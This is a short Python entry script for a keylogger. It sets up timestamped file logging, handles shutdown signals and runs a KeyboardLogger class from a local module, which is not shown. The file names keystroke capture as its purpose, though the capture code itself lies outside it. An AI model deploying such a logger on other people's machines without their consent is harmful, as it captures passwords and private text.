import keyboard_logger
import os
import logging
import sys
import signal
from timestamp import get_timestamp, get_timestamp_format


def get_log_file_path():
  current_dir = os.path.dirname(os.path.abspath(__file__))
  
  timestamp = get_timestamp()
  
  return os.path.join(current_dir, f"log_{timestamp}.txt")

logging.basicConfig(
  level=logging.INFO,
  format='%(message)s',
  datefmt= get_timestamp_format(),
  filemode='w',
  filename=get_log_file_path()
)

logger = logging.getLogger(__name__)

def graceful_shutdown(signum, frame):
  timestamp = get_timestamp()
  start_message = f"Program stop at {timestamp}"
  logger.info(start_message)
  sys.exit(0)

signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)


if __name__ == "__main__":
  timestamp = get_timestamp()
  start_message = f"Program start at {timestamp}"
  logger.info(start_message)
  keylogger = keyboard_logger.KeyboardLogger(logger=logger)
  keylogger.run()

